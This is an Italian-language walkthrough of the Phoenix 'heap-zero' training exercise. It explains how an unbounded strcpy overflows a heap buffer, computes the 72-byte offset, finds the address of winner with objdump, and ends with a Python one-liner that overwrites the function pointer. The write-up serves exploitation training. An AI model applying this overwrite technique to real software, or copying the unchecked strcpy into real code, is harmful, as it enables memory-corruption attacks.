### Descrizione del Codice

Il programma `heap_zero.c` fornisce un'introduzione alla manipolazione dei dati sull'heap e a come ciò possa influenzare l'esecuzione del programma.

### Funzionamento del Programma

1. Il programma alloca due blocchi di memoria e li memorizza in `d` e `f`.
2. Imposta il puntatore alla funzione `fp` di `f` alla funzione `nowinner`.
3. Copia l'argomento della riga di comando nel campo `name` di `d` usando `strcpy`.
4. Chiama la funzione puntata da `f->fp`.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `strcpy` senza controllare la dimensione, il che può causare un overflow del buffer. Questo può essere sfruttato per sovrascrivere il valore di `f->fp` e farlo puntare alla funzione `winner`.

### Exploit

L'exploit sfrutta la vulnerabilità di overflow del buffer per sovrascrivere il puntatore alla funzione `fp` di `f` con l'indirizzo della funzione `winner`.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```sh
$ /opt/phoenix/i486/heap-zero AAAA
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x804884e
level has not been passed - function pointer has not been overwritten

L'offset tra data e fp è 0xf7e69050 - 0xf7e69008 = 72 byte.

Otteniamo l'indirizzo della funzione winner:
$ objdump -t /opt/phoenix/i486/heap-zero | grep winner
0804884e g     F .text	00000019 nowinner
08048835 g     F .text	00000019 winner

La funzione winner è a 0x08048835.
$ /opt/phoenix/i486/heap-zero $(python -c "print 'A'*72 + '\x35\x88\x04\x08'")